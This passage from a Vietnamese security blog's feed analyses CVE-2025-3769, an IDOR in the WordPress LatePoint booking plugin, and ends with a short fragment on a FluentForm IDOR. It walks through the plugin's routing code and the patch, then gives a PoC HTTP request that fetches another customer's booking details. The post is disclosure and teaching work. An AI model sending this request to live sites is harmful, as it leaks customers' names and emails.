0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Không bao giờ tin dữ liệu do client cung cấp, kể cả trong các luồng nội bộ như thanh toán.&lt;/li&gt;&#xA;&lt;li&gt;IDOR thường phát sinh từ &lt;strong&gt;thiếu kiểm soát ownership&lt;/strong&gt;, không phải do thiếu xác thực đầu vào.&lt;/li&gt;&#xA;&lt;li&gt;Các endpoint &lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt; cần được kiểm soát chặt chẽ vì chúng mở cho mọi đối tượng truy cập.&lt;/li&gt;&#xA;&lt;li&gt;Payment flow phải ràng buộc chặt chẽ giữa &lt;strong&gt;submission – transaction – payment intent&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Cần xác thực cả &lt;strong&gt;nguồn request&lt;/strong&gt; lẫn &lt;strong&gt;ngữ cảnh nghiệp vụ&lt;/strong&gt;, không chỉ dữ liệu.&lt;/li&gt;&#xA;&lt;li&gt;Defense-in-depth (nhiều lớp kiểm soát) là cách duy nhất để ngăn IDOR hiệu quả.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/fluentform/vulnerability/wordpress-fluent-forms-plugin-6-1-7-unauthenticated-insecure-direct-object-reference-to-payment-status-tampering-via-submission-id-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress FluentForm Plugin &amp;lt;= 6.1.7 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-3769 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-26-cve-2025-3769/</link>
      <pubDate>Fri, 26 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-26-cve-2025-3769/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-26-cve-2025-3769/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;LatePoint – Calendar Booking Plugin for Appointments and Events&lt;/strong&gt; trên WordPress có &lt;strong&gt;lỗ hổng Insecure Direct Object Reference (IDOR)&lt;/strong&gt; ở tất cả các phiên bản lên đến và bao gồm &lt;strong&gt;5.1.92&lt;/strong&gt; thông qua tham số &lt;code&gt;view_booking_summary_in_lightbox&lt;/code&gt;, do &lt;strong&gt;thiếu kiểm tra hợp lệ trên khóa do người dùng điều khiển&lt;/strong&gt;.&lt;br&gt;&#xA;Lỗ hổng này cho phép &lt;strong&gt;kẻ tấn công chưa xác thực&lt;/strong&gt; có thể truy xuất chi tiết các cuộc hẹn, bao gồm &lt;strong&gt;tên khách hàng và địa chỉ email&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-3769&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-3769&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 5.1.92&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.1.93&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/latepoint/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LatePoint Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;LatePoint&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;5.1.92&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;5.1.93&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_nopriv_latepoint_route_call&amp;#39;, array( $this, &amp;#39;route_call&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; là hook dành cho người dùng chưa đăng nhập (kể cả Unauthenticated). Khi có request tới endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; với param &lt;code&gt;action=latepoint_route_call&lt;/code&gt; thì callback &lt;code&gt;route_call&lt;/code&gt; được gọi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function route_call() {&#xA;    $route_name = OsRouterHelper::get_request_param( &amp;#39;route_name&amp;#39;, OsRouterHelper::build_route_name( &amp;#39;dashboard&amp;#39;, &amp;#39;index&amp;#39; ) );&#xA;    OsRouterHelper::call_by_route_name( $route_name, OsRouterHelper::get_request_param( &amp;#39;return_format&amp;#39;, &amp;#39;html&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;route_call()&lt;/code&gt; gọi đến &lt;code&gt;get_request_param()&lt;/code&gt; với 2 tham số &lt;code&gt;&#39;route_name&#39;&lt;/code&gt; và giá trị default &lt;code&gt;OsRouterHelper::build_route_name( &#39;dashboard&#39;, &#39;index&#39; )&lt;/code&gt; nếu param &lt;code&gt;route_name&lt;/code&gt; không tồn tại trong request.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function get_request_param($name, $default = false){&#xA;    // $name = &amp;#39;route_name&amp;#39;&#xA;    // $default = OsRouterHelper::build_route_name( &amp;#39;dashboard&amp;#39;, &amp;#39;index&amp;#39;&#xA;    if(isset($_GET[$name])){&#xA;      $param = sanitize_text_field(wp_unslash($_GET[$name]));&#xA;    }elseif(isset($_POST[$name])){&#xA;      $param = sanitize_text_field(wp_unslash($_POST[$name]));&#xA;    }else{&#xA;    &#x9;$param = $default;&#xA;    }&#xA;    return $param;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public static function build_route_name($controller, $action){&#xA;    return $controller.&amp;#39;__&amp;#39;.$action;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sau khi có giá trị của &lt;code&gt;$route_name&lt;/code&gt;, hàm tiếp tục gọi &lt;code&gt;call_by_route_name&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function call_by_route_name($route_name, $return_format = &amp;#39;html&amp;#39;){&#xA;    OsDebugHelper::log_route($route_name, $return_format);&#xA;    $route_data = self::convert_route_name_to_controller_and_action($route_name);&#xA;    if(!empty($route_data)){&#xA;        $controller_obj = $route_data[&amp;#39;controller&amp;#39;];&#xA;        $action = $route_data[&amp;#39;action&amp;#39;];&#xA;        if($return_format) $controller_obj-&amp;gt;set_return_format($return_format);&#xA;        // check if user is allowed to access this route&#xA;        if($controller_obj-&amp;gt;can_current_user_access_action($action)){&#xA;            $controller_obj-&amp;gt;route_name = $route_name;&#xA;            $controller_obj-&amp;gt;$action();&#xA;        }else{&#xA;            if($controller_obj-&amp;gt;get_return_format() == &amp;#39;json&amp;#39;){&#xA;                $controller_obj-&amp;gt;send_json( [&amp;#39;status&amp;#39; =&amp;gt; LATEPOINT_STATUS_ERROR, &amp;#39;message&amp;#39; =&amp;gt; __(&amp;#39;Not Authorized&amp;#39;, &amp;#39;latepoint&amp;#39;)] );&#xA;            }else{&#xA;                echo &amp;#39;&amp;lt;div class=&amp;#34;latepoint-not-authorized&amp;#34;&amp;gt;&amp;lt;div class=&amp;#34;not-authorized-message&amp;#34;&amp;gt;&amp;#39;.esc_html__(&amp;#39;Not Authorized&amp;#39;, &amp;#39;latepoint&amp;#39;).&amp;#39;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;&amp;#39;;&#xA;            }&#xA;            exit();&#xA;        }&#xA;    }else{&#xA;        esc_html_e(&amp;#39;Page Not Found&amp;#39;, &amp;#39;latepoint&amp;#39;);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;call_by_route_name()&lt;/code&gt; sẽ ghi log route, lấy controller và action tương ứng với route đó gán cho &lt;code&gt;$route_data&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function convert_route_name_to_controller_and_action($route_name): array{&#xA;    list($controller_name, $action) = explode(&amp;#39;__&amp;#39;, $route_name);&#xA;    if(empty($controller_name) || empty($action)) return [];&#xA;    $controller_name = str_replace(&amp;#39;_&amp;#39;, &amp;#39;&amp;#39;, ucwords($controller_name, &amp;#39;_&amp;#39;));&#xA;    $controller_class_name = &amp;#39;Os&amp;#39;.$controller_name.&amp;#39;Controller&amp;#39;;&#xA;    if(class_exists($controller_class_name)) {&#xA;        $controller_obj = new $controller_class_name();&#xA;        if(method_exists($controller_obj, $action)) {&#xA;            // check if action is valid&#xA;            return [&amp;#39;controller&amp;#39; =&amp;gt; $controller_obj, &amp;#39;action&amp;#39; =&amp;gt; $action];&#xA;        }else{&#xA;            return [];&#xA;        }&#xA;    }else{&#xA;        return [];&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm nhận &lt;code&gt;$route_name&lt;/code&gt; dạng &lt;code&gt;&#39;controller__action&#39;&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Tách chuỗi theo &lt;code&gt;__&lt;/code&gt; ra &lt;code&gt;$controller_name&lt;/code&gt; và &lt;code&gt;$action&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Nếu rỗng → trả về &lt;code&gt;[]&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Chuyển &lt;code&gt;$controller_name&lt;/code&gt; sang PascalCase, bỏ &lt;code&gt;_&lt;/code&gt;, thêm prefix &lt;code&gt;Os&lt;/code&gt; và suffix &lt;code&gt;Controller&lt;/code&gt; → tên class.&lt;/li&gt;&#xA;&lt;li&gt;Kiểm tra class tồn tại → tạo object.&lt;/li&gt;&#xA;&lt;li&gt;Kiểm tra method tồn tại trong object → trả về mảng &lt;code&gt;[&#39;controller&#39; =&amp;gt; object, &#39;action&#39; =&amp;gt; method]&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Nếu class hoặc method không tồn tại → trả về mảng rỗng &lt;code&gt;[]&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;Hàm &lt;code&gt;call_by_route_name()&lt;/code&gt; tiếp tục sẽ kiểm tra &lt;code&gt;$route_data&lt;/code&gt; nếu không rỗng thì set format trả về, check quyền truy cập &lt;code&gt;can_current_user_access_action($action)&lt;/code&gt;: Nếu user hiện tại có thể  truy cập action này thì gọi method action: &lt;code&gt;$controller_obj-&amp;gt;$action()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Mặc định, khi người dùng có cookie của &lt;code&gt;LatePoint&lt;/code&gt; (trở thành customer) thì đáp ứng điều kiện này.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-26-cve-2025-3769/cookie.png&#34; title=&#34;Cookie của người dùng LatePoint&#34; data-thumbnail=&#34;/posts/2025-12-26-cve-2025-3769/cookie.png&#34; data-sub-html=&#34;&lt;h2&gt;Cookie&lt;/h2&gt;&lt;p&gt;Cookie của người dùng LatePoint&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-26-cve-2025-3769/cookie.png&#39; alt=&#34;Cookie&#34; height=&#34;388&#34; width=&#34;773&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Cookie của người dùng LatePoint&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Để có được cookie này, ta cần phải order và sử dụng chức năng create account:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-26-cve-2025-3769/order.png&#34; title=&#34;Tạo account&#34; data-thumbnail=&#34;/posts/2025-12-26-cve-2025-3769/order.png&#34; data-sub-html=&#34;&lt;h2&gt;Account&lt;/h2&gt;&lt;p&gt;Tạo account&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-26-cve-2025-3769/order.png&#39; alt=&#34;Account&#34; height=&#34;899&#34; width=&#34;694&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Tạo account&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;Khi thực hiện diff code, tôi thấy một số logic thuộc các hàm của class &lt;code&gt;OsCustomerCabinetController&lt;/code&gt; đã được fix bằng cách kiểm tra quyền sở hữu trước khi trả dữ liệu:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( $order-&amp;gt;is_new_record() || ( $order-&amp;gt;customer_id != OsAuthHelper::get_logged_in_customer_id() ) ) {&#xA;    $this-&amp;gt;send_json( array(&#xA;        &amp;#39;status&amp;#39; =&amp;gt; LATEPOINT_STATUS_ERROR,&#xA;        &amp;#39;message&amp;#39; =&amp;gt; __(&amp;#39;Not Allowed&amp;#39;, &amp;#39;latepoint&amp;#39;)&#xA;    ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-26-cve-2025-3769/diff.png&#34; title=&#34;Một số hàm được fix&#34; data-thumbnail=&#34;/posts/2025-12-26-cve-2025-3769/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Fix&lt;/h2&gt;&lt;p&gt;Một số hàm được fix&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-26-cve-2025-3769/diff.png&#39; alt=&#34;Fix&#34; height=&#34;915&#34; width=&#34;1860&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Một số hàm được fix&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khớp với phân tích của tôi ở trên, ví dụ:&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Route hợp lệ&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;route_name=customer_cabinet__view_booking_summary_in_lightbox&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;sẽ được map thành&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;OsCustomerCabinetController::view_booking_summary_in_lightbox()&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;view_booking_summary_in_lightbox()&lt;/code&gt; được gọi để trả về dữ liệu booking.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Unauthenticated Attacker&amp;#34;] &#xA;--&amp;gt; B[&amp;#34;Create Booking (no login required)&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Creates Customer account&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Customer cookie issued (logged-in as customer)&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Attacker sends request to admin-ajax.php?action=latepoint_route_call&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;route_name=customer_cabinet__view_booking_summary_in_lightbox&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Router resolves to OsCustomerCabinetController&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;can_current_user_access_action() → PASS&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;view_booking_summary_in_lightbox() called&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;Booking ID taken from request&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;No ownership validation (&amp;lt;= 5.1.92)&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;Sensitive booking data leaked (email, name, etc.)&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Gửi request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php?t=1766721895425 HTTP/1.1&#xA;Host: localhost&#xA;Cookie: __stripe_mid=f13365af-449c-4412-b77c-7213da0dbe814d9925; wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; latepoint_cart_86a9106ae65537651a8e456835b316ab=8ffe0e2c-9c69-48f8-94d9-18dd24022f90; latepoint_customer_logged_in_cookie&#xA;&#xA;action=latepoint_route_call&amp;amp;route_name=customer_cabinet__view_booking_summary_in_lightbox&amp;amp;params=booking_id=other_booking_id&amp;amp;return_format=json&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-26-cve-2025-3769/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-26-cve-2025-3769/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Resutl&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-26-cve-2025-3769/result.png&#39; alt=&#34;Resutl&#34; height=&#34;653&#34; width=&#34;1874&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; 